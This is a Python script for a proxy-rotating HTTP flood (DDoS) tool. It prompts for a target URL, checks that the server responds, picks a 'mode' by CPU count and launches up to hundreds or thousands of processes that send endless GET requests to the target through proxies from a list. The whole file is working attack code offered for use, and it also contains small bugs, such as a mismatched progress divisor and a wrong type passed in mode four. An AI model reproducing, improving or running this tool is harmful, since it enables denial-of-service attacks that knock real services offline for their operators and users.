from multiprocessing import Process
import os
from time import sleep
import random

try:
	import requests
except:
	if os.name == 'nt':
		os.system('pip install requests')
		os.system('cls')
	elif os.name == 'posix':
		os.system('pip3 install requests')
		os.system('clear')
	try: 
		import requests
	except:
		print('Your OS cant install python library "requests", please self-install this library')
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

try:
	from cpuinfo import get_cpu_info
except:
	if os.name == 'nt':
		os.system('pip install py-cpuinfo')
		os.system('cls')
	elif os.name == 'posix':
		os.system('pip3 install py-cpuinfo')
		os.system('clear')
	try: 
		from cpuinfo import get_cpu_info
	except:
		print('Your OS cant install python library "py-cpu-info", please self-install this library')
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

with open('proxy.list') as plist:
	proxys = plist.read().split("\n")

def printns(text : type('')):
	if os.name == 'nt':
		os.system('cls')
	if os.name == 'posix':
		os.system('clear')
	print(text)

printns('Randomize proxy list...')
random.shuffle(proxys)

def mode(mod : int, ip : type('')):
	if mod == 1:
		mode_one(ip)
	elif mod == 2:
		mode_two(ip)
	elif mod == 3:
		mode_three(ip)
	elif mod == 4:
		mode_four(ip)
	else:
		mode_one(ip)

def mode_one(ip : type('')):
	Count, i = 0, 0
	while Count <= 100:
		printns(f'{round(100 * Count / 100, 2)}% start, please wait')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 20
		Count += 1
	sleep(0.1)
	printns('All proxies started, starting while True: sleep(0.1)')

def mode_two(ip : type('')):
	Count, i = 0, 0
	while Count <= 200:
		printns(f'{round(100 * Count / 200, 2)}% start, please wait')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 10
		Count += 1
	sleep(0.1)
	printns('All proxies started, starting while True: sleep(0.1)')

def mode_three(ip : type('')):
	Count, i = 0, 0
	while Count <= 400:
		printns(f'{round(100 * Count / 300, 2)}% start, please wait')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 10
		Count += 1
	sleep(0.1)
	printns('All proxies started, starting while True: sleep(0.1)')

def mode_four(ip : type('')):
	printns('Starting... : info')
	for proxy in proxys:
		Process(target=dos, args=(proxy, ip)).start()
	sleep(0.1)
	printns('All proxies started, starting while True: sleep(0.1)')

def dos(proxy : list, ip : type('')):
	try:
		while True:
			for p in proxy:
				requests.get(ip, proxies={ 'http' : 'http://' + p }, headers=requests.utils.default_headers())
	except KeyboardInterrupt:
		print('One of process stoped by CTRL + C : info')
	except:
		print('one of process stoped : fatal error')


def ddos():
	ip = input('Enter ip > ')
	try:
		e = requests.get(ip, headers=requests.utils.default_headers())
		if e.status_code == 404:
			print('Server error : info')
			return 0
		elif e.status_code == 200:
			print('DDOS can be released')
		else:
			print(f'STATUS CODE: {e.status_code}, DDOS maybe cant be released')
	except requests.exceptions.SSLError:
		print('DDOS cant be released')
		return 0
	except requests.exceptions.InvalidURL:
		print('Invalid URL, please input correct URL')
		ddos()
	except requests.exceptions.MissingSchema:
		print('Invalid URL, please input correct URL')
		ddos()
	cpu = get_cpu_info()['count']
	if cpu <= 2:
		recmod = 1
	elif cpu <= 4:
		recmod = 2
	elif cpu <= 8 :
		recmod = 3
	else:
		recmod = 4
	print('Choose your mode:')
	print('Mode       Process count      Proxy per procces           Recomended platform')
	print('1          100                20                          NETBOOK, RaspberryPI')
	print('2          200                20                          PC, Server')
	print('3          400                20                          PC, Server')
	print('4          max*               1                           PC(very stronger), Central server')
	print('---- *max - using maximum count proxies per process, example: 7000 proxies = 7000 process')
	print(f'--- Recomended mode for your PC: {recmod}; CPU count: {cpu}')
	mod = ''
	while mod == '':
		mod = input('Enter process mode > ')
		if mod in ['1', '2', '3', '4']: break
		else:
			mod = ''
			printns('Uncorrect mode : info')
	print("CTRL + Z for closing programm : info")
	mode(int(mod), ip)
	try:
		while True: 
			printns(f'Pinging to {ip}...')
			e = requests.get(ip, headers=requests.utils.default_headers())
			printns(f'SERVER STATUS: {e.status_code}, STATUS UPDATE: 5 secs + server ping')
			sleep(5)
	except KeyboardInterrupt:
		print('Closing all process and clearing RAM, wait 5 sec')
		sleep(5)
		printns('Cleared! Bye Bye!')
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

if __name__ == '__main__':
	ddos()